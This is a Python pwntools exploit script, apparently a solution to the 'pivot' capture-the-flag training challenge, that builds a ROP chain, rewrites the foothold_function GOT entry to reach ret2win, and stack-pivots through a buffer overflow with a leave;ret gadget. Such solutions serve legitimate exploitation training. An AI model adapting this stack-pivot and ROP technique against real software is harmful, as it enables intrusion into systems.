from pwn import *
r=process('./pivot')
binary=ELF('./pivot',checksec=False)
#gdb.attach(r, """break *0x00000000004009a7""")
leaveret=0x00000000004008ef#leave ; ret
offset_foothold_ret2win=279
foothold=binary.symbols['foothold_function']
got_foothold=binary.symbols.got['foothold_function']
r.recvuntil('pivot: ')
pivot_addr=int(r.recvline().strip(),16)
r.recvuntil('> ')
add=0x0000000000400828#add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
poprbxrbp=0x0000000000400a2a#pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
ropchain=p64(0)
ropchain+=p64(foothold)
ropchain+=p64(poprbxrbp)+p64(offset_foothold_ret2win)+p64(got_foothold+0x3d)+p64(0)*4+p64(add)
ropchain+=p64(foothold)
r.sendline(ropchain)
r.recvuntil('> ')
payload="a"*32
payload+=p64(pivot_addr)

payload+=p64(leaveret)
r.sendline(payload)
r.interactive()